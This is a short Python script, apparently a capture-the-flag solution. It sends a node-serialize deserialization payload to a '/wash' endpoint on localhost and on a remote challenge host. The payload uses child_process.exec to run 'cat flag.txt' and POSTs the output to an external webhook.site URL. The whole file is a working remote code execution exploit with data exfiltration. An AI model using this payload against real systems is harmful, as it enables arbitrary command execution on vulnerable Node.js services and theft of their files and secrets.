#!/usr/bin/env python3
import requests
import json

data = {"rce":"""_$$ND_FUNC$$_function (){\n \trequire('child_process').exec('cat flag.txt', function(error, stdout, stderr) { const request = new Request('https://webhook.site/007b0b17-25df-47fc-8278-6480bae39e4e', {method: 'POST', body: '{"foo": ' +  stdout + '}'}); const url = request.url;const method = request.method;const credentials = request.credentials;const bodyUsed = request.bodyUsed;fetch(request).then((response) => {if (response.status === 200) {return response.json();} else {throw new Error('Something went wrong on API server!');}}).then((response) => {
    console.debug(response);}).catch((error) => {console.error(error);});
});\n }()"""}

r = requests.post("http://localhost:3000/wash",json=data)
r = requests.post("http://io6.ept.gg:32855/wash",json=data)
print(r.text)